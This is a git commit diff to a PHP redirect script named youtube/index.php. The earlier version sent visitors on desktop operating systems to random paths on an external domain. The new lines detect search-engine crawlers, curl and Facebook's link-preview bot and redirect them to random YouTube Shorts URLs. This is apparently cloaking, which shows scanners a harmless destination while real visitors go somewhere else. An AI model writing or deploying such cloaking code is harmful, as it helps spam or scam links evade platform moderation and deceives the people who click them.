5f1a510ca468a13c5640dcdfc1e1df9d4e04a4ee
busine011 <112756675+busine011@users.noreply.github.com>
2022-11-17 08:16:16 -0400

    Update index.php

--- youtube/index.php
+++ youtube/index.php
@@ -9,40 +9,13 @@ if (!isset($_GET['hash']) && file_exists('links/' . $_GET['hash']))
 
     else
     {
-    if (preg_match("/windows?/i", $_SERVER['HTTP_USER_AGENT']))
-    {
-		$url = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
-        header("location: $url", true, 200);
-        die();
-    }
-
-    else if (preg_match("/Linux x86_64?/i", $_SERVER['HTTP_USER_AGENT']))
-    {
-		$urlx1 = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
-        header("location: $urlx1", true, 200);
-        die();
-    }
-
-    else if (preg_match("/Macintosh?/i", $_SERVER['HTTP_USER_AGENT']))
-    {
-		$urlx2 = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
-        header("location: $urlx2", true, 200);
-        die();
-    }
-
-    else if (preg_match("/facebook(external)?/i", $_SERVER['HTTP_USER_AGENT']))
-    {
+	    
+   if (preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit|facebook(external)/i', $_SERVER['HTTP_USER_AGENT'])) {
         $short_urlx2 = "https://www.youtube.com/shorts/".substr(md5(mt_rand()),0,20);
         header("location: $short_urlx2", true, 200);
         die();
-    }
-
-    else if (!preg_match("/(FB(AN|AV)|\[FB)/i", $_SERVER['HTTP_USER_AGENT']))
-    {
-		$urlx3 = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
-        header("location: $urlx3", true, 200);
-        die();
-    }
+    }	    
+	    
 
     else
     {
